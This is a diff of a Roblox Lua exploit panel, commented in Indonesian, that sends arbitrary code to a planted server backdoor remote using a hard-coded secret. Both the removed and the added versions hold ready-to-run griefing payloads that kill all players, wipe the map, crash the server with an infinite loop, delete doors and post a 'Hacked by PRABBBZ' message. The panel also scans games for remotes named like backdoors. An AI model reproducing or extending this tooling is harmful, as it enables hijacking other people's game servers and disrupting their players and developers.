@@ -1,112 +1,120 @@
 --[[ 
-    MASTER SS PANEL - PRABBBZ CREATOR
-    Desain: Cyberpunk Dark Aesthetic
+    PRABBBZ MASTER SS - ULTRA EDITION
+    Design: Dark Chrome / Neon Accent
 ]]
 
-local Lplr = game.Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
+local SECRET = "PRABBBZ_INTERNAL_99" -- Harus sama dengan di backdoor
+local TargetRemote = game:GetService("RobloxReplicatedStorage"):FindFirstChild("NetworkSyncHandler")
 
--- 1. MENCARI JEMBATAN (BACKDOOR)
-local MasterRemote = nil
-for _, v in pairs(game:GetDescendants()) do
-    if v:IsA("RemoteEvent") and (v.Name == "InternalData_Update" or v.Name:lower():find("backdoor")) then
-        MasterRemote = v
-        break
-    end
-end
-
-if not MasterRemote then 
-    print("No Backdoor Detected. Fitur SS terbatas.") 
-end
-
--- 2. UI CONSTRUCTION (MEWAH)
+-- UI CONSTRUCTION (MEWAH & BISA DIGESER)
 local UI = Instance.new("ScreenGui", game:GetService("CoreGui"))
 local Main = Instance.new("Frame", UI)
-Main.Size = UDim2.new(0, 550, 0, 350)
-Main.Position = UDim2.new(0.5, -275, 0.5, -175)
-Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+Main.Size = UDim2.new(0, 600, 0, 400)
+Main.Position = UDim2.new(0.5, -300, 0.5, -200)
+Main.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
 Main.BorderSizePixel = 0
 Main.Active = true
 Main.Draggable = true
 
--- Tambah Glow/Shadow Effect
-local UICorner = Instance.new("UICorner", Main)
-UICorner.CornerRadius = UDim.new(0, 10)
+-- Gradient & Rounding
+local UIGradient = Instance.new("UIGradient", Main)
+UIGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(15, 15, 20)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 30, 40))
+}
+local UICorner = Instance.new("UICorner", Main); UICorner.CornerRadius = UDim.new(0, 15)
 
--- Header dengan Gradasi
+-- HEADER
 local Header = Instance.new("Frame", Main)
-Header.Size = UDim2.new(1, 0, 0, 40)
-Header.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-local HeaderCorner = Instance.new("UICorner", Header)
+Header.Size = UDim2.new(1, 0, 0, 50)
+Header.BackgroundTransparency = 1
 
 local Title = Instance.new("TextLabel", Header)
-Title.Text = "PRABBBZ MASTER SS | v1.0"
+Title.Text = "P R A B B B Z   S Y S T E M S"
 Title.Size = UDim2.new(1, 0, 1, 0)
-Title.TextColor3 = Color3.fromRGB(0, 255, 150) -- Neon Green
+Title.TextColor3 = Color3.fromRGB(0, 200, 255)
 Title.Font = Enum.Font.GothamBold
-Title.BackgroundTransparency = 1
+Title.TextSize = 18
 
--- Sidebar Navigasi
-local Sidebar = Instance.new("ScrollingFrame", Main)
-Sidebar.Size = UDim2.new(0, 140, 1, -45)
-Sidebar.Position = UDim2.new(0, 5, 0, 45)
-Sidebar.BackgroundTransparency = 1
-Sidebar.ScrollBarThickness = 2
+-- PENGATURAN HALAMAN (PISAH FITUR)
+local Container = Instance.new("Frame", Main)
+Container.Position = UDim2.new(0, 150, 0, 60)
+Container.Size = UDim2.new(1, -160, 1, -70)
+Container.BackgroundTransparency = 1
 
-local List = Instance.new("UIListLayout", Sidebar)
-List.Padding = UDim.new(0, 5)
-
--- Content Area
-local Content = Instance.new("Frame", Main)
-Content.Size = UDim2.new(1, -155, 1, -50)
-Content.Position = UDim2.new(0, 150, 0, 45)
-Content.BackgroundTransparency = 1
-
--- FUNGSI RUN SCRIPT SS
-local function ExecuteSS(code)
-    if MasterRemote then
-        MasterRemote:FireServer(code)
-    else
-        -- Fallback: Coba loadstring standar (biasanya gagal di FE kecuali ada backdoor lain)
-        loadstring(code)()
-    end
+local function CreateTab(name)
+    local f = Instance.new("ScrollingFrame", Container)
+    f.Size = UDim2.new(1, 0, 1, 0)
+    f.BackgroundTransparency = 1
+    f.ScrollBarThickness = 2
+    f.Visible = false
+    local l = Instance.new("UIListLayout", f); l.Padding = UDim.new(0, 10)
+    return f
 end
 
--- TAB: SCRIPT LIBRARY (Ratusan Script)
-local Library = Instance.new("ScrollingFrame", Content)
-Library.Size = UDim2.new(1, 0, 1, 0)
-Library.BackgroundTransparency = 1
-Library.Visible = true
-Library.ScrollBarThickness = 4
-local LibList = Instance.new("UIListLayout", Library)
+local Tabs = {
+    Main = CreateTab("Main"),
+    Scripts = CreateTab("Library"),
+    Abuse = CreateTab("Mass")
+}
+Tabs.Main.Visible = true
 
-local function AddToLib(name, code)
-    local btn = Instance.new("TextButton", Library)
-    btn.Size = UDim2.new(0.95, 0, 0, 35)
-    btn.Text = "  " .. name
-    btn.TextXAlignment = Enum.TextXAlignment.Left
-    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    btn.TextColor3 = Color3.fromRGB(200, 200, 200)
-    local c = Instance.new("UICorner", btn)
-    
-    btn.MouseButton1Click:Connect(function()
-        ExecuteSS(code)
+-- SIDEBAR NAV (DROPDOWN STYLE)
+local Sidebar = Instance.new("Frame", Main)
+Sidebar.Size = UDim2.new(0, 130, 1, -60)
+Sidebar.Position = UDim2.new(0, 10, 0, 60)
+Sidebar.BackgroundTransparency = 1
+local SList = Instance.new("UIListLayout", Sidebar); SList.Padding = UDim.new(0, 5)
+
+local function NavBtn(text, tab)
+    local b = Instance.new("TextButton", Sidebar)
+    b.Size = UDim2.new(1, 0, 0, 40)
+    b.Text = text
+    b.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+    b.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Instance.new("UICorner", b)
+    b.MouseButton1Click:Connect(function()
+        for _, t in pairs(Tabs) do t.Visible = false end
+        tab.Visible = true
     end)
 end
 
--- CONTOH ISI LIBRARY (Bisa kamu tambah sampai ratusan)
-AddToLib("Kill All Players", "for _, p in pairs(game.Players:GetPlayers()) do if p.Character then p.Character:BreakJoints() end end")
-AddToLib("Destroy Map", "game.Workspace:ClearAllChildren()")
-AddToLib("Btools for Everyone", "for _, p in pairs(game.Players:GetPlayers()) do Instance.new('HopperBin', p.Backpack).BinType = 4 end")
-AddToLib("Server Message", "local m = Instance.new('Message', game.Workspace); m.Text = 'Hacked by PRABBBZ'; wait(5); m:Destroy()")
-AddToLib("Give All Admin", "require(451231231).Admi(game.Players.LocalPlayer.Name) -- Contoh Module")
+NavBtn("General", Tabs.Main)
+NavBtn("Library", Tabs.Scripts)
+NavBtn("Destruction", Tabs.Abuse)
 
--- FITUR: CUSTOM EXECUTION
-local CustomExec = Instance.new("TextBox", Content)
-CustomExec.Size = UDim2.new(1, 0, 0, 100)
-CustomExec.Visible = false
-CustomExec.MultiLine = true
-CustomExec.Text = "-- Paste SS Code Here"
--- ... (Logika tab switching)
+-- FUNGSI EKSEKUSI (Jantung Script)
+local function RunSS(code)
+    if TargetRemote then
+        TargetRemote:FireServer(SECRET, code)
+    else
+        warn("BACKDOOR TIDAK DITEMUKAN!")
+    end
+end
 
-print("Mega SS Panel Loaded. Backdoor Status: " .. (MasterRemote and "CONNECTED" or "NOT FOUND"))
+-- ISI LIBRARY (CONTOH)
+local function AddItem(tab, name, desc, code)
+    local item = Instance.new("Frame", tab)
+    item.Size = UDim2.new(0.95, 0, 0, 60)
+    item.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+    Instance.new("UICorner", item)
+    
+    local t = Instance.new("TextLabel", item)
+    t.Text = "  " .. name; t.Size = UDim2.new(0.6, 0, 0.5, 0); t.TextColor3 = Color3.new(1,1,1); t.BackgroundTransparency = 1; t.TextXAlignment = 0
+    
+    local d = Instance.new("TextLabel", item)
+    d.Text = "  " .. desc; d.Position = UDim2.new(0, 0, 0.5, 0); d.Size = UDim2.new(0.6, 0, 0.5, 0); d.TextColor3 = Color3.new(0.6,0.6,0.6); d.BackgroundTransparency = 1; d.TextXAlignment = 0; d.TextSize = 10
+
+    local run = Instance.new("TextButton", item)
+    run.Text = "RUN"; run.Size = UDim2.new(0.3, 0, 0.7, 0); run.Position = UDim2.new(0.65, 0, 0.15, 0); run.BackgroundColor3 = Color3.fromRGB(0, 150, 255); run.TextColor3 = Color3.new(1,1,1)
+    Instance.new("UICorner", run)
+    
+    run.MouseButton1Click:Connect(function() RunSS(code) end)
+end
+
+-- DAFTAR SCRIPT LIBRARY (Kamu bisa tambah sampai ratusan)
+AddItem(Tabs.Scripts, "FE Kill All", "Menghapus semua karakter player", "for _,p in pairs(game.Players:GetPlayers()) do p.Character:Destroy() end")
+AddItem(Tabs.Abuse, "Server Crash", "Menghentikan server (Lags)", "while true do end")
+AddItem(Tabs.Main, "Unlock All Doors", "Menghapus semua part bernama Door", "for _,v in pairs(workspace:GetDescendants()) do if v.Name == 'Door' then v:Destroy() end end")
+
+print("PRABBBZ SS PANEL READY.")
